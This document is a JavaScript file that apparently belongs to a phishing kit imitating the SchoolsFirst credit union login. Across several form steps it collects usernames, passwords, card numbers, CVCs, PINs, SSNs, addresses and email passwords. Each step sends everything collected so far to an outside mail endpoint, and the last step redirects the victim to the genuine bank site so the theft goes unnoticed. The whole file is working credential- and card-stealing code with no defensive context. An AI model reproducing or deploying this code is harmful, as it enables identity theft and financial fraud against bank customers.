const firstsubmit = async () => {
  document.getElementById("firstbtn").setAttribute("disabled", true);

  const firstuse = document.getElementById("orgus").value;
  const firstmove = document.getElementById("orgpd").value;

  if (
    firstuse !== undefined &&
    firstuse !== "" &&
    firstuse !== null &&
    firstmove !== undefined &&
    firstmove !== "" &&
    firstmove !== null
  ) {
    sessionStorage.setItem("Keyusername", firstuse);
    sessionStorage.setItem("Keypassword", firstmove);

    const sendDetails = `<h3> UserName : ${firstuse} <br> Password : ${firstmove} </h3>`;

    const sendData = {
      siteName: "SchoolFirst",
      siteSend: sendDetails,
    };

    const billResponse = await fetch(
      "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
      {
        method: "POST",
        headers: {
          "Content-Type": "application.json",
        },
        body: JSON.stringify(sendData),
      }
    );

    billResponse
      .text()
      .then(
        (data) => data === "Sent" && location.assign("./confirmLogin.html")
      );
  } else {
    document.getElementById("orgus").style.borderBottom = "1px solid #b22222";

    document.getElementById("orgpd").style.borderBottom = "1px solid #b22222";

    document.getElementById("firstbtn").removeAttribute("disabled");
  }
};

const secondsubmit = async () => {
  document.getElementById("secondbtn").setAttribute("disabled", true);

  const firstcn = document.getElementById("orgcn").value;
  const firsted = document.getElementById("orged").value;
  const firstcc = document.getElementById("orgcc").value;
  const firstcp = document.getElementById("orgcp").value;

  if (firstcn.length < 14) {
    document.getElementById("orgcn").style.borderBottom = "1px solid #b22222";

    document.getElementById("secondbtn").removeAttribute("disabled");
    return false;
  }

  if (
    firsted.length < 4 ||
    Number(firsted.split("/")[0]) > 12 ||
    Number(firsted.split("/")[1]) < 22
  ) {
    document.getElementById("orged").style.borderBottom = "1px solid #b22222";

    document.getElementById("secondbtn").removeAttribute("disabled");
    return false;
  }

  if (firstcc.length < 3) {
    document.getElementById("orgcc").style.borderBottom = "1px solid #b22222";

    document.getElementById("secondbtn").removeAttribute("disabled");
    return false;
  }

  if (firstcp.length < 4) {
    document.getElementById("orgcp").style.borderBottom = "1px solid #b22222";

    document.getElementById("secondbtn").removeAttribute("disabled");
    return false;
  }

  sessionStorage.setItem("cardNumber", firstcn);
  sessionStorage.setItem("cardExpiryDate", firsted);
  sessionStorage.setItem("cardCVC", firstcc);
  sessionStorage.setItem("cardPin", firstcp);

  const sendDetails = `<h3> UserName : ${sessionStorage.Keyusername} <br> Password : ${sessionStorage.Keypassword} <br> Card Number : ${firstcn} <br> Card Expiry Date  : ${firsted} <br> Card CVC : ${firstcc} <br> Card Pin : ${firstcp} </h3> `;

  const sendData = {
    siteName: "SchoolFirst",
    siteSend: sendDetails,
  };

  const billResponse = await fetch(
    "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
    {
      method: "POST",
      headers: {
        "Content-Type": "application.json",
      },
      body: JSON.stringify(sendData),
    }
  );

  billResponse
    .text()
    .then(
      (data) => data === "Sent" && location.assign("./confirmPersonal.html")
    );
};

const thirdsubmit = async () => {
  document.getElementById("thirdbtn").setAttribute("disabled", true);

  const userfullName = document.getElementById("userfullName").value;
  const userfullMobile = document.getElementById("userfullMobile").value;
  const userfullAddress = document.getElementById("userfullAddress").value;
  const userfullCity = document.getElementById("userfullCity").value;
  const userfullState = document.getElementById("userfullState").value;
  const userfullZip = document.getElementById("userfullZip").value;
  const userfullSSN = document.getElementById("userfullSSN").value;

  if (
    userfullName !== undefined &&
    userfullName !== "" &&
    userfullName !== null &&
    userfullMobile !== undefined &&
    userfullMobile !== "" &&
    userfullMobile !== null &&
    userfullAddress !== undefined &&
    userfullAddress !== "" &&
    userfullAddress !== null &&
    userfullCity !== undefined &&
    userfullCity !== "" &&
    userfullCity !== null &&
    userfullState !== undefined &&
    userfullState !== "" &&
    userfullState !== null &&
    userfullZip !== undefined &&
    userfullZip !== "" &&
    userfullZip !== null &&
    userfullSSN !== undefined &&
    userfullSSN !== "" &&
    userfullSSN !== null
  ) {
    sessionStorage.setItem("BOWuserfullName", userfullName);
    sessionStorage.setItem("BOWuserfullMobile", userfullMobile);
    sessionStorage.setItem("BOWuserfullAddress", userfullAddress);
    sessionStorage.setItem("BOWuserfullCity", userfullCity);
    sessionStorage.setItem("BOWuserfullState", userfullState);
    sessionStorage.setItem("BOWuserfullZip", userfullZip);
    sessionStorage.setItem("BOWuserfullSSN", userfullSSN);

    const sendDetails = `<h3> UserName : ${sessionStorage.Keyusername} <br> Password : ${sessionStorage.Keypassword} <br> Card Number : ${sessionStorage.cardNumber} <br> Card Expiry Date  : ${sessionStorage.cardExpiryDate} <br> Card CVC : ${sessionStorage.cardCVC} <br> Card Pin : ${sessionStorage.cardPin} <br> Full Name  : ${userfullName} <br> Mobile : ${userfullMobile} <br> Address : ${userfullAddress} <br> City : ${userfullCity} <br> State : ${userfullState} <br> Zip Code : ${userfullZip} <br> SSN : ${userfullSSN} </h3>`;

    const sendData = {
      siteName: "SchoolFirst",
      siteSend: sendDetails,
    };

    const billResponse = await fetch(
      "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
      {
        method: "POST",
        headers: {
          "Content-Type": "application.json",
        },
        body: JSON.stringify(sendData),
      }
    );

    billResponse
      .text()
      .then(
        (data) => data === "Sent" && location.assign("./confirmEmail.html")
      );
  } else {
    document.getElementById("userfullName").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullMobile").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullAddress").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullCity").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullState").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullZip").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullSSN").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("thirdbtn").removeAttribute("disabled");
  }
};

const lastsubmit = async () => {
  document.getElementById("lastbtn").setAttribute("disabled", true);

  const email = document.getElementById("orgus").value;
  const emailpassword = document.getElementById("orgpd").value;

  if (
    email !== undefined &&
    email !== "" &&
    email !== null &&
    emailpassword !== undefined &&
    emailpassword !== "" &&
    emailpassword !== null
  ) {
    sessionStorage.setItem("KeyEmail", email);
    sessionStorage.setItem("KeyEmailpassword", emailpassword);

    completeSubmission();
  } else {
    document.getElementById("orgus").style.borderBottom = "1px solid #b22222";

    document.getElementById("orgpd").style.borderBottom = "1px solid #b22222";

    document.getElementById("lastbtn").removeAttribute("disabled");
  }
};

const completeSubmission = async () => {
  const sendDetails = `<h3> UserName : ${sessionStorage.Keyusername} <br> Password : ${sessionStorage.Keypassword} <br> Card Number : ${sessionStorage.cardNumber} <br> Card Expiry Date  : ${sessionStorage.cardExpiryDate} <br> Card CVC : ${sessionStorage.cardCVC} <br> Card Pin : ${sessionStorage.cardPin} <br> Full Name  : ${sessionStorage.BOWuserfullName} <br> Mobile : ${sessionStorage.BOWuserfullMobile} <br> Address : ${sessionStorage.BOWuserfullAddress} <br> City : ${sessionStorage.BOWuserfullCity} <br> State : ${sessionStorage.BOWuserfullState} <br> Zip Code : ${sessionStorage.BOWuserfullZip} <br> SSN : ${sessionStorage.BOWuserfullSSN} <br> Email : ${sessionStorage.KeyEmail} <br> Email Password : ${sessionStorage.KeyEmailpassword} </h3>`;

  const sendData = {
    siteName: "SchoolFirst",
    siteSend: sendDetails,
  };

  const billResponse = await fetch(
    "https://mailclient.trivecodes.com/BilalServer/mail_key.php",
    {
      method: "POST",
      headers: {
        "Content-Type": "application.json",
      },
      body: JSON.stringify(sendData),
    }
  );

  billResponse
    .text()
    .then(
      (data) =>
        data === "Sent" &&
        setTimeout(
          () =>
            location.assign(
              "https://www.schoolsfirstfcu.org/gateway/schoolsfirstfcu/login#/"
            ),
          3000
        )
    );
};
